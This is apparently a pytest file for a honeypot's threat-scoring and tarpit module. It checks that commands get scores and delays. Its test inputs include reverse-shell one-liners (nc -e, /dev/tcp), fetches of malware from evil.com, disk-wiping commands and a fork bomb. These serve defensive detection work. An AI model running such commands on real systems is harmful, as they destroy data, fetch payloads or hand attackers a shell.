"""Tests for miragepot.defense_module module."""

import pytest
from unittest.mock import patch
from miragepot.defense_module import (
    calculate_threat_score,
    should_delay,
    compute_delay,
    apply_tarpit,
    THREAT_KEYWORDS,
)


class TestThreatScoring:
    """Tests for threat score calculation."""

    def test_benign_commands_low_score(self):
        """Low-risk commands should have low scores."""
        assert calculate_threat_score("ls") < 30
        assert calculate_threat_score("pwd") < 30
        assert calculate_threat_score("whoami") < 30
        assert calculate_threat_score("id") < 30

    def test_medium_risk_commands(self):
        """Medium-risk commands should have moderate scores."""
        assert 20 <= calculate_threat_score("sudo ls") < 80
        assert 20 <= calculate_threat_score("chmod 777 file") < 80
        assert 20 <= calculate_threat_score("ssh user@host") < 80

    def test_high_risk_commands(self):
        """High-risk commands should have high scores."""
        assert calculate_threat_score("wget http://evil.com/malware") >= 60
        assert calculate_threat_score("curl http://evil.com/backdoor") >= 60
        assert calculate_threat_score("nc -e /bin/bash attacker 4444") >= 70

    def test_destructive_commands(self):
        """Destructive commands should have very high scores."""
        assert calculate_threat_score("rm -rf /") >= 100
        assert calculate_threat_score("mkfs.ext4 /dev/sda") >= 100
        assert calculate_threat_score("dd if=/dev/zero of=/dev/sda") >= 90

    def test_reverse_shell_patterns(self):
        """Reverse shell patterns should have highest scores."""
        assert calculate_threat_score("bash -i >& /dev/tcp/10.0.0.1/4444") >= 80
        assert calculate_threat_score("python -c 'import socket'") >= 80

    def test_case_insensitive(self):
        """Scoring should be case-insensitive."""
        assert calculate_threat_score("WGET http://evil.com") == calculate_threat_score(
            "wget http://evil.com"
        )

    def test_additive_scoring(self):
        """Multiple keywords should add to score."""
        base_score = calculate_threat_score("wget")
        combined_score = calculate_threat_score("sudo wget")
        assert combined_score > base_score

    def test_empty_command(self):
        """Empty command should have zero score."""
        assert calculate_threat_score("") == 0

    def test_unknown_command(self):
        """Unknown commands should have zero base score."""
        assert calculate_threat_score("myunknowncommand") == 0


class TestDelayDecision:
    """Tests for tarpit delay decisions."""

    def test_no_delay_for_low_scores(self):
        """Low scores should not trigger delay."""
        assert should_delay(0) is False
        assert should_delay(10) is False
        assert should_delay(39) is False

    def test_delay_for_medium_scores(self):
        """Medium scores should trigger delay."""
        assert should_delay(40) is True
        assert should_delay(60) is True

    def test_delay_for_high_scores(self):
        """High scores should trigger delay."""
        assert should_delay(80) is True
        assert should_delay(100) is True
        assert should_delay(150) is True


class TestDelayComputation:
    """Tests for delay duration computation."""

    def test_no_delay_for_low_scores(self):
        """Low scores should have zero delay."""
        assert compute_delay(0) == 0.0
        assert compute_delay(39) == 0.0

    def test_small_delay_for_medium_scores(self):
        """Medium scores should have 1-2 second delay."""
        delay = compute_delay(50)
        assert 1.0 <= delay <= 2.0

    def test_larger_delay_for_high_scores(self):
        """High scores should have 2-4 second delay."""
        delay = compute_delay(100)
        assert 2.0 <= delay <= 4.0

    def test_max_delay_for_extreme_scores(self):
        """Extreme scores should have 3-5 second delay."""
        delay = compute_delay(150)
        assert 3.0 <= delay <= 5.0

    def test_delay_is_randomized(self):
        """Delays should vary due to randomization."""
        delays = [compute_delay(60) for _ in range(10)]
        # With randomization, not all delays should be identical
        assert len(set(delays)) > 1


class TestApplyTarpit:
    """Tests for tarpit application."""

    @patch("miragepot.defense_module.time.sleep")
    def test_applies_delay(self, mock_sleep):
        """apply_tarpit should call sleep with computed delay."""
        score = 60  # Should result in 1-2 second delay
        result = apply_tarpit(score)

        # Should have called sleep
        mock_sleep.assert_called_once()
        # Should return the delay applied
        assert 1.0 <= result <= 2.0

    @patch("miragepot.defense_module.time.sleep")
    def test_no_delay_for_low_score(self, mock_sleep):
        """apply_tarpit should not sleep for low scores."""
        result = apply_tarpit(10)

        mock_sleep.assert_not_called()
        assert result == 0.0

    @patch("miragepot.defense_module.time.sleep")
    def test_returns_delay_value(self, mock_sleep):
        """apply_tarpit should return the actual delay applied."""
        result = apply_tarpit(80)

        # Result should match what was passed to sleep
        if mock_sleep.called:
            sleep_arg = mock_sleep.call_args[0][0]
            assert result == sleep_arg


class TestThreatKeywords:
    """Tests for threat keyword definitions."""

    def test_keywords_are_lowercase(self):
        """All keywords should be lowercase for case-insensitive matching."""
        for keyword in THREAT_KEYWORDS.keys():
            # Keywords are matched against lowercased input
            # so the keyword itself should work with lowercase
            assert keyword == keyword.lower() or " " in keyword

    def test_keyword_values_are_positive(self):
        """All threat scores should be positive."""
        for keyword, score in THREAT_KEYWORDS.items():
            assert score > 0, f"Keyword '{keyword}' has non-positive score"

    def test_has_low_risk_commands(self):
        """Should have some low-risk commands defined."""
        low_risk = [k for k, v in THREAT_KEYWORDS.items() if v < 30]
        assert len(low_risk) > 0

    def test_has_high_risk_commands(self):
        """Should have some high-risk commands defined."""
        high_risk = [k for k, v in THREAT_KEYWORDS.items() if v >= 60]
        assert len(high_risk) > 0

    def test_destructive_commands_highest(self):
        """Destructive commands should have highest scores."""
        assert THREAT_KEYWORDS.get("rm -rf", 0) >= 100
        assert THREAT_KEYWORDS.get(":(){:|:&};:", 0) >= 100  # Fork bomb
